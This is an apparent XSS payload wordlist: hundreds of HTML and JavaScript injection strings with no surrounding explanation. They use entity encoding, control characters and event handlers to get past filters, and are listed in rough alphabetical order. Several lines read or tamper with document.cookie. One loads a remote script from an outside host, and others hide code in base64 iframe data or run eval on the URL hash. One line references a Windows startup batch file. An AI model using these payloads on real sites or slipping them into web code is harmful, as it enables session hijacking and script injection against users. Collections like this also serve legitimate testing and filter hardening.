<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<a href          =              "javas  cript   :ale                            rt(1)">test
<a href=”javascript:”>Clickme</a>
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript#document.cookie=true;">
>"<a href="javascript#document.cookie=true;">
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
<A HREF="javascript:document.location='http://www.vulnerability-lab.com/'">CrossSiteScripting</A>
<a href='javascript:http://@cc_on/confirm%28location%29'>click</a>
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
<a href=”javaScrRipt:alert(1)”>Clickme</a>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;confirm&lpar;1&rpar;">Click<test>
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;1&rpar;" >Click<test>
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:confirm&lpar;1&rpar;">Click<test>
<a href="j&#x61;vascript:&#x61;lert(-1)"
<a <!-- --> href="j&#x61;vascript:&#x61;lert(-1)">hello</a>
<a <!-- href="j&#x61;vascript:&#x61;lert&#x28;31337&#x29;;">Hello</a>
<a href="rhainfosec.com" onclimbatree=alert(1)>ClickHere</a>
<a href="rhainfosec.com" onmouseover=alert(1)>ClickHere</a>
<A HREF="//www.google.com/">XSS</A>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
"/></a></><img src=1.gif onerror=alert(1)>
+alert(0)+
';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){//
';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}");}
\”;alert(1)//
\\”;alert(1)//
alert(1)
\";alert('CrossSiteScripting');//
alert(document["cook" + ([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]])
';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
alert(String.fromCharCode(88,83,83));'))">
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//\";alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</SCRIPT>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
alert(this["\x64\x6f\x63\x75\x6d\x65\x6e\x74" ]["cook" + ([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]])
";alert('XSS');//
\";alert('XSS');//
\";alert('XSS');//
\";alert('XSS');//
\";alert('XSS');//
\\";alert('XSS');//
&alphabet="><script>alert(String.fromCharCode(88,83,83))</script>
&amount=50.0&currency_code=USD&sender_country="><script>alert('XSS')</script>
&Amount=';alert(/XSSPOSED)//\\';alert(1)//";alert(2)//\\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}");}alert(6);function+xss(){//&q=';alert(0)//\\';alert(1)//";alert(2)//\\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}");}alert(6);function+xss(){//&From=USD&To=EUR
<anything onbeforescriptexecute=confirm(1)>
<a onmouseover%0B=location=%27\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3 B\x63\x6F\x6E\x66\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x63\x 6F\x6F\x6B\x69\x65\x26\x72\x70\x61\x72\x3B%27>CLICK
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<a onmouseover=location='&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#10 1&#114&#116&#40&#49&#41'>a<a>
<a onmouseover=location=’javascript:alert(1)>click
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
&app="><script>alert%28"XSS"%29</script>&return_url=
&area=search&q="%20onclick='alert("XSS");'
&article=Steve-Sjogren-Community-Servant-Evangelism&amp;ac=%22%3E%3CScRipT%3Econfirm%28/XSSPOSED/%29%3C%2FScrIpT%3E
&as2n32vujas83bn2932g=645492598632
ASP 		a = val1,val2
ASP.NET 	a = val1,val2
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
</a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<audio src=1 onerror=alert(1)>
<audio src="data:audio/mp3,%FF%F3%84%C4%FF%F3%14% C4" oncanplay="alert(1)">
<audio src=x onerror=prompt(1);>
&authenticationKey=aaaaaaaaaaaaaaaaaaaaaaaaaaa&language='"--></style></script><script>alert(document.cookie)</script>
B
<base href=data:/,0/><script src=alert(1)></script>
<base href=javascript:/0/><iframe src=,alert(1)></iframe>
<BASE HREF="javascript:alert('CrossSiteScripting');//">
<BASE HREF="javascript:alert('XSS');//">
<BASE HREF="javascript:alert('XSS');//">
<BASE HREF="javascript:alert('XSS');//">
<BASE HREF="javascript:alert('XSS');//">
<BASE HREF="javascript:document.cookie=true;//">
>"<BASE HREF="javascript:document.cookie=true;//">
<BASE HREF="javascript:javascript:alert(1);//">
<BASE HREF="javascript:javascript:alert(1);//">
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<BGSOUND SRC="javascript:alert('CrossSiteScripting');">
<BGSOUND SRC="javascript:alert('XSS');">
<BGSOUND SRC="javascript:alert('XSS');">
<BGSOUND SRC="javascript:alert('XSS');">
<BGSOUND SRC="javascript:alert('XSS');">
<bgsound src="javascript:document.cookie=true;">
>"<bgsound src="javascript:document.cookie=true;">
<BGSOUND SRC="javascript:document.cookie=true;">
>"<BGSOUND SRC="javascript:document.cookie=true;">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BGSOUND SRC="javascript:javascript:alert(1);">
<blah style="blah:expression(alert(1))" />
&blob=%3Cbody%20onload=alert%28%22XSS%22%29%3E
&blogid=120
<BODY BACKGROUND="javascript:alert('CrossSiteScripting')">
<BODY BACKGROUND="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY BACKGROUND="javascript:document.cookie=true;">
>"<BODY BACKGROUND="javascript:document.cookie=true;">
<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
<body <body onload=;;;;;al:eval('al'+'ert(1)');;>
</BODY></HTML>
<body language=vbs onload=alert-1 // IE-8
<body/onactivate=alert(1)>
<body/onactivate=URL=name//
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<body onfocus="location='javascrpt:alert(1) >123
<body/onhashchange=alert(1)><a href=#>clickit
<body oninput=alert(document.domain)><input autofocus></br>
<body oninput=javascript:alert(1)><input autofocus>
<body oninput=javascript:alert(1)><input autofocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
<body onload=;;;;;;;;;;;_=alert;_(1);;;;
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("CrossSiteScripting")>
<BODY ONLOAD=alert('CrossSiteScripting')>
<BODY ONLOAD=alert('hellox worldss')>
<BODY ONLOAD=alert(íXSSí)>
<body onLoad="alert('XSS');"
<BODY onload!#$%&()*~+_.,:;?@[/|]^`=alert("XSS")>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert("XSS")>
"><BODY onload!#$%&()*~+_.,:;?@[/|]^`=alert("XSS")>
<BODY ONLOAD=alert('XSS')>
<BODY ONLOAD=alert('XSS')>
<BODY ONLOAD=alert('XSS')>
<BODY ONLOAD=alert('XSS')>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<body onload="document.cookie=true;">
>"<body onload="document.cookie=true;">
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
>"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
<BODY ONLOAD=document.cookie=true;>
>"<BODY ONLOAD=document.cookie=true;>
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
<body/onload=location=name//
<body/onload=location=write(top)//
<body/onload=&lt;!--&gt;&#10alert(1)>
